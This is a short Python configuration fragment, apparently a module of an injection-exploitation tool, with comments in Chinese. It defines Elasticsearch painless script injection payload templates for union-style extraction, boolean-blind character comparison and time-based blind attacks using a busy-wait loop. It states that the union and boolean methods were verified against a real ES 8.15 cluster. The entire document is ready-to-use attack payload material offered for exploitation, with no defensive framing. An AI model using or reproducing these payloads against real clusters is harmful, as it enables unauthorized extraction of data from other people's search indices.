"""Elasticsearch — 注入面: _search 的 script/script_fields 参数值(painless 源码)。
union: script_fields 直接返回字段值(响应 JSON 中), 1 请求拉全部命中行。
bool: 脚本返回布尔, 响应 _fields.l 中出现 true, --true-mark 匹配 "true"。
time: 重循环(不可靠)。painless 白名单收紧的集群可能直接拒绝脚本。
ES 8.15 真机已验证(union/bool); time 未实测。"""

PROFILE = {
    'name': 'elasticsearch',
    'note': 'ES painless script 注入 (union/bool 已验证; time 未实测)',
    'err_tpl':   None,
    'err_regex': None,
    'err_chunk': 30,
    'err_strip': 0,
    'bool_tpl':  "doc['{F}'].value.length()>={P} && doc['{F}'].value.charAt({P}-1)>{K}",
    'time_tpl':  "long t=System.currentTimeMillis(); if(doc['{F}'].value.charAt({P}-1)>{K}){while(System.currentTimeMillis()-t<{T}000){}} return true;",
    'union_tpl': "doc['{F}'].value",
    'row_wrap':  None,
}
